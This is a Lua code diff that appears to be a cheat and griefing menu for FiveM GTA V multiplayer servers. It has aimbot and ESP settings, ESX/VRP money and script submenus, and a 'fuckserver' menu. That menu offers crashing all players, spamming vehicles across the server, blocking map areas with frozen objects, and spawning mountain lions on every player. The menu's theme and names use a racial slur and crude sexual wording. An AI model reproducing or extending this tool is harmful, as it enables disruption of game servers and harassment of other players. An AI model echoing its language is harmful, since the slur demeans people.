+    outfit.mask_texture = GetPedTextureVariation(ped, 10)
+    
+    outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
+    outfit.aux_palette = GetPedPaletteVariation(ped, 11)
+    outfit.aux_texture = GetPedTextureVariation(ped, 11)
+    
+    return outfit
+end
+
+local function SetCurrentOutfit(outfit)
+    local ped = PlayerPedId()
+    
+    SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
+    SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
+    SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
+    SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
+    SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
+    
+    SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
+    SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
+    SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
+    SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
+    SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
+    SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
+    SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
+    SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
+    SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
+    SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
+    SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
+    SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
+end
+
+local function GetResources()
+    local resources = {}
+    for i = 1, GetNumResources() do
+        resources[i] = GetResourceByFindIndex(i)
+    end
+    return resources
+end
+
+function IsResourceInstalled(name)
+    local resources = GetResources()
+    for i = 1, #resources do
+        if resources[i] == name then
+            return true
+        else
+            return false
+        end
+    end
+end
+
+function IhadSexWithMyStepMother.SetFont(id, font)
+    buttonFont = font
+    menus[id].titleFont = font
+end
+
+function IhadSexWithMyStepMother.SetMenuFocusBackgroundColor(id, r, g, b, a)
+    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
+end
+
+function IhadSexWithMyStepMother.SetMaxOptionCount(id, count)
+    setMenuProperty(id, 'maxOptionCount', count)
+end
+
+function IhadSexWithMyStepMother.PopupWindow(x, y, title)
+
+end
+
+
+function IhadSexWithMyStepMother.SetTheme(id, theme)
+    if theme == "StupidNiggaPaster" then
+        IhadSexWithMyStepMother.SetMenuBackgroundColor(id, 0, 0, 0, 50)
+         IhadSexWithMyStepMother.SetTitleBackgroundColor(id, 255, 255, 255, 0)
+        IhadSexWithMyStepMother.SetTitleColor(id, 255, 255, 255, 0)
+        IhadSexWithMyStepMother.SetMenuSubTextColor(id, 255, 255, 255, 255)
+        IhadSexWithMyStepMother.SetMenuFocusBackgroundColor(id, 255, 255, 255, 255)
+        IhadSexWithMyStepMother.SetFont(id, 0)
+        IhadSexWithMyStepMother.SetMenuX(id, .75)
+        IhadSexWithMyStepMother.SetMenuY(id, 0.025)
+        IhadSexWithMyStepMother.SetMenuWidth(id, 0.222)-- 0.23
+        IhadSexWithMyStepMother.SetMaxOptionCount(id, 15)-- 10
+        
+        titleHeight = 0.11 --0.11
+        titleXOffset = 0.5 -- 0.5
+        titleYOffset = 0.03 --0.03
+        titleSpacing = 2 -- 2
+        buttonHeight = 0.038 --0.038
+        buttonScale = 0.365 --0.365
+        buttonTextXOffset = 0.005 --0.005
+        buttonTextYOffset = 0.005 --0.005
+        
+        themecolor = '~w~'
+        themearrow = " ~s~»" -- Old Arrow   »
+    end
+end
+
+function IhadSexWithMyStepMother.InitializeTheme()
+    for i = 1, #menulist do
+        IhadSexWithMyStepMother.SetTheme(menulist[i], theme)
+    end
+end
+
+-- ComboBox w/ new index behaviour (does not wrap around)
+function IhadSexWithMyStepMother.ComboBox2(text, items, currentIndex, selectedIndex, callback)
+	local itemsCount = #items
+	local selectedItem = items[currentIndex]
+	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
+
+	if itemsCount > 1 and isCurrent then
+		selectedItem = tostring(selectedItem)
+	end
+
+	if IhadSexWithMyStepMother.Button(text, selectedItem) then
+		selectedIndex = currentIndex
+		callback(currentIndex, selectedIndex)
+		return true
+	elseif isCurrent then
+		if currentKey == keys.left then
+            if currentIndex > 1 then currentIndex = currentIndex - 1 
+            elseif currentIndex == 1 then currentIndex = 1 end
+		elseif currentKey == keys.right then
+            if currentIndex < itemsCount then  currentIndex = currentIndex + 1 
+            elseif currentIndex == itemsCount then currentIndex = itemsCount end
+		end
+	else
+		currentIndex = selectedIndex
+	end
+
+	callback(currentIndex, selectedIndex)
+    return false
+end
+
+-- Button with a slider
+function IhadSexWithMyStepMother.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
+	local itemsCount = #items
+	local selectedItem = items[currentIndex]
+	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
+
+	if itemsCount > 1 and isCurrent then
+		selectedItem = tostring(selectedItem)
+	end
+
+	if IhadSexWithMyStepMother.Button2(text, items, itemsCount, currentIndex) then
+		selectedIndex = currentIndex
+		callback(currentIndex, selectedIndex)
+		return true
+	elseif isCurrent then
+		if currentKey == keys.left then
+            if currentIndex > 1 then currentIndex = currentIndex - 1 
+            elseif currentIndex == 1 then currentIndex = 1 end
+		elseif currentKey == keys.right then
+            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
+            elseif currentIndex == itemsCount then currentIndex = itemsCount end
+		end
+	else
+		currentIndex = selectedIndex
+    end
+	callback(currentIndex, selectedIndex)
+	return false
+end
+
+
+
+local function drawButton2(text, items, itemsCount, currentIndex)
+	local x = menus[currentMenu].x + menus[currentMenu].width / 2
+	local multiplier = nil
+
+	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
+		multiplier = optionCount
+	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
+		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
+	end
+
+	if multiplier then
+		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
+		local backgroundColor = nil
+		local textColor = nil
+		local subTextColor = nil
+		local shadow = false
+
+		if menus[currentMenu].currentOption == optionCount then
+			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
+			textColor = menus[currentMenu].menuFocusTextColor
+			subTextColor = menus[currentMenu].menuFocusTextColor
+		else
+			backgroundColor = menus[currentMenu].menuBackgroundColor
+			textColor = menus[currentMenu].menuTextColor
+			subTextColor = menus[currentMenu].menuSubTextColor
+			shadow = true
+		end
+
+        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
+        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2
+
+        local XOffset = 0.1 -- Default value in case of any error?
+        local stabilizer = 1
+
+        -- Draw order from top to bottom
+        if itemsCount >= 40 then
+            stabilizer = 1.005
+        end
+		
+        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) -- Button Rectangle -2.15
+        drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) -- Slide Outline
+        drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) -- Slide
+        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text
+
+        --Ugly Code, I'll refactor it later
+        local CurrentItem = tostring(items[currentIndex])
+        if string.len(CurrentItem) == 1 then XOffset = 0.1050
+        elseif string.len(CurrentItem) == 2 then XOffset = 0.1025
+        elseif string.len(CurrentItem) == 3 then XOffset = 0.10015
+        elseif string.len(CurrentItem) == 4 then XOffset = 0.1085
+        elseif string.len(CurrentItem) == 5 then XOffset = 0.1070
+        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1055
+        end
+        -- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
+		-- (sliderWidth * roundNum((itemsCount / 2), 3)
+        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) -- Current Item Text
+	end
+end
+
+-- Getting the center of an odd number of itemsCount (breaks on negative numbers)
+function roundNum(num, numDecimalPlaces)
+    local mult = 10^(numDecimalPlaces or 0)
+    return math.floor(num * mult + 0.5) / mult
+  end
+
+function IhadSexWithMyStepMother.Button2(text, items, itemsCount, currentIndex)
+	local buttonText = text
+
+	if menus[currentMenu] then
+		optionCount = optionCount + 1
+
+		local isCurrent = menus[currentMenu].currentOption == optionCount
+
+		drawButton2(text, items, itemsCount, currentIndex)
+
+		if isCurrent then
+			if currentKey == keys.select then
+				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
+				debugPrint(buttonText..' button pressed')
+				return true
+			elseif currentKey == keys.left or currentKey == keys.right then
+				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
+			end
+		end
+
+		return false
+	else
+		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')
+
+		return false
+	end
+end
+
+Resources = GetResources()
+
+ResourcesToCheck = {
+        -- ESX
+        "es_extended", "esx_dmvschool", "esx_policejob", "",
+        -- VRP
+        "vrp", "vrp_trucker", "vrp_TruckerJob"
+}
+
+Citizen.CreateThread(function()
+    if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
+	if mpMessage then ShowMPMessage(subMessage1, 50) else ShowInfo(subMessage1) end
+    ShowInfo(motd3)
+	
+
+    -- COMBO BOXES
+    
+    local currThemeIndex = 1
+    local selThemeIndex = 1
+
+    local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
+    local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
+
+    local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
+    local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
+
+    local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
+    local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
+
+    local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
+    local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
+
+    local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
+    local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
+
+	local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
+    local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
+    
+    if currHatIndex == 0 or currHatIndex == 1 then -- No Hat
+        currHatIndex = 9
+        selHatIndex = 9
+    end
+
+	local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
+    local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
+
+    -- Fixes the Hat starting at index 1 not displaying because its value is 0
+    if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
+        currHatTextureIndex = 1
+        selHatTextureIndex = 1
+    end
+    
+	local currPFuncIndex = 1
+	local selPFuncIndex = 1
+	
+	local currVFuncIndex = 1
+	local selVFuncIndex = 1
+	
+	local currSeatIndex = 1
+	local selSeatIndex = 1
+	
+	local currTireIndex = 1
+	local selTireIndex = 1
+	
+    local currNoclipSpeedIndex = 1
+    local selNoclipSpeedIndex = 1
+    
+    local currForcefieldRadiusIndex = 1
+    local selForcefieldRadiusIndex = 1
+    
+    local currFastRunIndex = 1
+    local selFastRunIndex = 1
+    
+    local currFastSwimIndex = 1
+    local selFastSwimIndex = 1
+
+    local currObjIndex = 1
+    local selObjIndex = 1
+    
+    local currRotationIndex = 3
+    local selRotationIndex = 3
+    
+    local currDirectionIndex = 1
+    local selDirectionIndex = 1
+    
+    local Outfits = {}
+    local currClothingIndex = 1
+    local selClothingIndex = 1
+    
+    local currGravIndex = 3
+    local selGravIndex = 3
+    
+    local currSpeedIndex = 1
+    local selSpeedIndex = 1
+    
+    local currAttackTypeIndex = 1
+    local selAttackTypeIndex = 1
+    
+    local currESPDistance = 3
+    local selESPDistance = 3
+	
+	local currESPRefreshIndex = 1
+	local selESPRefreshIndex = 1
+    
+    local currAimbotBoneIndex = 1
+    local selAimbotBoneIndex = 1
+    
+    local currSaveLoadIndex1 = 1
+    local selSaveLoadIndex1 = 1
+    local currSaveLoadIndex2 = 1
+    local selSaveLoadIndex2 = 1
+    local currSaveLoadIndex3 = 1
+    local selSaveLoadIndex3 = 1
+    local currSaveLoadIndex4 = 1
+    local selSaveLoadIndex4 = 1
+    local currSaveLoadIndex5 = 1
+    local selSaveLoadIndex5 = 1
+    
+    local currRadioIndex = 1
+    local selRadioIndex = 1
+
+    local currWeatherIndex = 1
+    local selWeatherIndex = 1
+
+    -- GLOBALS
+    local TrackedPlayer = nil
+	local SpectatedPlayer = nil
+	local FlingedPlayer = nil
+    local PossessingVeh = false
+	local pvblip = nil
+	local pvehicle = nil
+    local pvehicleText = ""
+	local IsPlayerHost = nil
+	
+	if NetworkIsHost() then
+		IsPlayerHost = "~g~Yes"
+	else
+		IsPlayerHost = "~r~No"
+	end
+	
+    local savedpos1 = nil
+    local savedpos2 = nil
+    local savedpos3 = nil
+    local savedpos4 = nil
+    local savedpos5 = nil
+    
+    -- TOGGLES
+    local includeself = true
+    local Collision = true
+    local objVisible = true
+    local PlaceSelf = true
+    local SpawnInAir = true
+    local SpawnEngineOn = true
+    
+    -- TABLES
+    SpawnedObjects = {}
+    
+    -- MAIN MENU
+    IhadSexWithMyStepMother.CreateMenu('StupidNiggaPaster', "")
+    IhadSexWithMyStepMother.SetSubTitle('StupidNiggaPaster', '')
+    
+    -- MAIN MENU SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('self', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('player', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('weapon', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('vehicle', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('world', 'StupidNiggaPaster', '')
+	IhadSexWithMyStepMother.CreateSubMenu('teleport', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('misc', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('lua', 'StupidNiggaPaster', '')
+    IhadSexWithMyStepMother.CreateSubMenu('settingslol', 'StupidNiggaPaster', '')
+    
+    -- PLAYER MENU SUBMENUS  
+    IhadSexWithMyStepMother.CreateSubMenu('allplayer', 'player', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('playeroptions', 'player', ' ')
+	IhadSexWithMyStepMother.CreateSubMenu('troll', 'playeroptions', ' ')
+	IhadSexWithMyStepMother.CreateSubMenu('crashtroll', 'playeroptions', '  ')
+	IhadSexWithMyStepMother.CreateSubMenu('weaponspawnerplayer', 'playeroptions', ' ')
+	
+    
+    -- SELF MENU SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('appearance', 'self', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('modifiers', 'self', ' ')
+	
+	-- APPEARANCE SUBMENUS
+	IhadSexWithMyStepMother.CreateSubMenu('modifyskintextures', 'appearance', "")
+    IhadSexWithMyStepMother.CreateSubMenu('modifyhead', 'modifyskintextures', " ")
+	IhadSexWithMyStepMother.CreateSubMenu('skinsmodels', 'appearance', "")
+    
+    -- WEAPON MENU SUBMENUS
+	
+	IhadSexWithMyStepMother.CreateSubMenu('WeaponCustomization', 'weapon', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('weaponspawner', 'weapon', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('melee', 'weaponspawner', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('pistol', 'weaponspawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('smg', 'weaponspawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('shotgun', 'weaponspawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('assault', 'weaponspawner', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('sniper', 'weaponspawner', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('thrown', 'weaponspawner', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('heavy', 'weaponspawner', ' ')
+    
+    -- VEHICLE MENU SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('vehiclespawner', 'vehicle', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('vehiclemods', 'vehicle', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('vehiclemenu', 'vehicle', '  ')
+    IhadSexWithMyStepMother.CreateSubMenu('VehBoostMenu', 'vehicle', '  ')
+    -- VEHICLE SPAWNER MENU
+    IhadSexWithMyStepMother.CreateSubMenu('compacts', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('sedans', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('suvs', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('coupes', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('muscle', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('sportsclassics', 'vehiclespawner', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('sports', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('super', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('WWBA', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('offroad', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('industrial', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('utility', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('vans', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('cycles', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('boats', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('helicopters', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('planes', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('service', 'vehiclespawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('commercial', 'vehiclespawner', '')
+    -- VEHICLE MODS SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('vehiclecolors', 'vehiclemods', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', ' ')
+    
+    IhadSexWithMyStepMother.CreateSubMenu('primary_classic', 'vehiclecolors_primary', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('primary_matte', 'vehiclecolors_primary', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('primary_metal', 'vehiclecolors_primary', '')
+    
+    IhadSexWithMyStepMother.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', '')
+    
+    IhadSexWithMyStepMother.CreateSubMenu('vehicletuning', 'vehiclemods', ' ')
+    
+    -- WORLD MENU SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('objectspawner', 'StupidNiggaPaster', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('objectlist', 'objectspawner', '')
+    IhadSexWithMyStepMother.CreateSubMenu('weather', 'world', '')
+    IhadSexWithMyStepMother.CreateSubMenu('time', 'world', ' ')
+    
+    -- MISC MENU SUBMENUS
+	IhadSexWithMyStepMother.CreateSubMenu('esp', 'misc', '')
+	IhadSexWithMyStepMother.CreateSubMenu('webradio', 'misc', '')
+    IhadSexWithMyStepMother.CreateSubMenu('credits', 'settingslol', '')
+    
+    -- TELEPORT MENU SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('saveload', 'teleport', '')
+    IhadSexWithMyStepMother.CreateSubMenu('pois', 'teleport', '')
+	--fuck server
+	IhadSexWithMyStepMother.CreateSubMenu('fuckserver', 'StupidNiggaPaster', '')
+    
+    -- LUA MENU SUBMENUS
+    IhadSexWithMyStepMother.CreateSubMenu('esx', 'lua', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('vrp', 'lua', ' ')
+    IhadSexWithMyStepMother.CreateSubMenu('player1', 'lua', ' ')
+	IhadSexWithMyStepMother.CreateSubMenu('other', 'player1', ' ')
+	IhadSexWithMyStepMother.CreateSubMenu('money', 'lua', ' ')
+	IhadSexWithMyStepMother.CreateSubMenu('drogas', 'lua', ' ')
+	IhadSexWithMyStepMother.CreateSubMenu('mecanico', 'lua', ' ')
+    
+    IhadSexWithMyStepMother.InitializeTheme()
+    
+    while true do
+        
+        -- MAIN MENU
+        if IhadSexWithMyStepMother.IsMenuOpened('StupidNiggaPaster') then
+        if IhadSexWithMyStepMother.MenuButton('Self Option', 'self') then  
+            elseif IhadSexWithMyStepMother.MenuButton('Player Option', 'player') then
+            elseif IhadSexWithMyStepMother.MenuButton('Visuals Option', 'misc') then
+            elseif IhadSexWithMyStepMother.MenuButton('Weapons Option', 'weapon') then
+            elseif IhadSexWithMyStepMother.MenuButton('Vehicle Option', 'vehicle') then
+            elseif IhadSexWithMyStepMother.MenuButton('World Option', 'world') then
+			elseif IhadSexWithMyStepMother.MenuButton('Teleport Option', 'teleport') then
+			elseif IhadSexWithMyStepMother.MenuButton('Object Option', 'objectspawner') then
+			elseif IhadSexWithMyStepMother.MenuButton('~r~END ~g~Server', 'fuckserver') then
+            elseif IhadSexWithMyStepMother.MenuButton('~v~Lua Option', 'lua') then
+            elseif IhadSexWithMyStepMother.MenuButton('Menu Option', 'settingslol') then
+            elseif IhadSexWithMyStepMother.Button('~r~!!CLOSE MENU!!') then break
+            end
+            ShowInfo(motd2)
+	        ShowInfo(motd)
+            ShowInfo(motd5)
+            
+        
+        -- PLAYER OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('player') then
+                local playerlist = GetActivePlayers()
+                for i = 1, #playerlist do
+                    local currPlayer = playerlist[i]
+                    if IhadSexWithMyStepMother.MenuButton("~r~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~s~[~r~DEAD~s~]" or "~s~[~g~ALIVE~s~]"), 'playeroptions') then
+                        selectedPlayer = currPlayer end
+                end
+      
+			
+			
+			
+		--Fuck server
+		elseif IhadSexWithMyStepMother.IsMenuOpened('fuckserver') then
+		    if IhadSexWithMyStepMother.CheckBox("Include Self", includeself, "No", "Yes") then
+                includeself = not includeself
+			elseif IhadSexWithMyStepMother.Button("Kick All Players From Vehicle") then
+                KickAllFromVeh(includeself)
+			elseif IhadSexWithMyStepMother.CheckBox("Spam vehicle all Server", nukeserver) then
+			ShowInfo("~y~Fucking Players...")
+				nukeserver = not nukeserver
+			elseif IhadSexWithMyStepMother.Button("Set ~s~All Nearby Vehicles Plate Text") then
+            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
+            for k in EnumerateVehicles() do
+                RequestControlOnce(k)
+                SetVehicleNumberPlateText(k, plateInput)
+            end
+			elseif IhadSexWithMyStepMother.CheckBox("Make ~s~All Cars Fly", FlyingCars) then
+                FlyingCars = not FlyingCars
+		elseif IhadSexWithMyStepMother.CheckBox("CRASH - ALL PLAYERS", Enable_GcPhone) then
+                Enable_GcPhone = not Enable_GcPhone
+				
+		elseif IhadSexWithMyStepMother.Button("~r~CLOSE - Simeons MAP") then
+		x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e8 = -145066854
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+					local cd1 = CreateObject(e8, -50.97, -1066.92, 26.52, true, true, false)
+					local cd2 = CreateObject(e8, -63.86, -1099.05, 25.26, true, true, false)
+					local cd3 = CreateObject(e8, -44.13, -1129.49, 25.07, true, true, false)
+                    SetEntityHeading(cd1, 160.59)
+                    SetEntityHeading(cd2, 216.98)
+					SetEntityHeading(cd3, 291.74)
+                    FreezeEntityPosition(cd1, true)
+                    FreezeEntityPosition(cd2, true)
+					FreezeEntityPosition(cd3, true)
+			elseif IhadSexWithMyStepMother.Button("~r~CLOSE - Police Department MAP") then
+			x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e8 = -145066854
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+					local pd1 = CreateObject(e8, 439.43, -965.49, 27.05, true, true, false)
+                    local pd2 = CreateObject(e8, 401.04, -1015.15, 27.42, true, true, false)
+                    local pd3 = CreateObject(e8, 490.22, -1027.29, 26.18, true, true, false)
+                    local pd4 = CreateObject(e8, 491.36, -925.55, 24.48, true, true, false)
+                    SetEntityHeading(pd1, 130.75)
+                    SetEntityHeading(pd2, 212.63)
+                    SetEntityHeading(pd3, 340.06)
+                    SetEntityHeading(pd4, 209.57)
+                    FreezeEntityPosition(pd1, true)
+                    FreezeEntityPosition(pd2, true)
+                    FreezeEntityPosition(pd3, true)
+                    FreezeEntityPosition(pd4, true)	
+			elseif IhadSexWithMyStepMother.Button("~r~CLOSE - The Whole Square MAP") then
+                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e8 = -145066854
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+					local e9 = CreateObject(e8, 97.8, -993.22, 28.41, true, true, false)
+					local ea = CreateObject(e8, 247.08, -1027.62, 28.26, true, true, false)
+					local e92 = CreateObject(e8, 274.51, -833.73, 28.25, true, true, false)
+					local ea2 = CreateObject(e8, 291.54, -939.83, 27.41, true, true, false)
+					local ea3 = CreateObject(e8, 143.88, -830.49, 30.17, true, true, false)
+					local ea4 = CreateObject(e8, 161.97, -768.79, 29.08, true, true, false)
+					local ea5 = CreateObject(e8, 151.56, -1061.72, 28.21, true, true, false)
+                    SetEntityHeading(e9, 39.79)
+                    SetEntityHeading(ea, 128.62)
+					SetEntityHeading(e92, 212.1)
+					SetEntityHeading(ea2, 179.22)
+					SetEntityHeading(ea3, 292.37)
+					SetEntityHeading(ea4, 238.46)
+					SetEntityHeading(ea5, 61.43)
+                    FreezeEntityPosition(e9, true)
+                    FreezeEntityPosition(ea, true)
+					FreezeEntityPosition(e92, true)
+					FreezeEntityPosition(ea2, true)
+					FreezeEntityPosition(ea3, true)
+					FreezeEntityPosition(ea4, true)
+                    FreezeEntityPosition(ea5, true)
+	elseif IhadSexWithMyStepMother.Button("Spawn Lion ~s~all Players") then
+                    local mtlion = "A_C_MtLion"
+                    local plist = GetActivePlayers()
+                        for i = 0, #plist do
+                        local co = GetEntityCoords(GetPlayerPed(i))
+                        RequestModel(GetHashKey(mtlion))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(mtlion)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                                CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
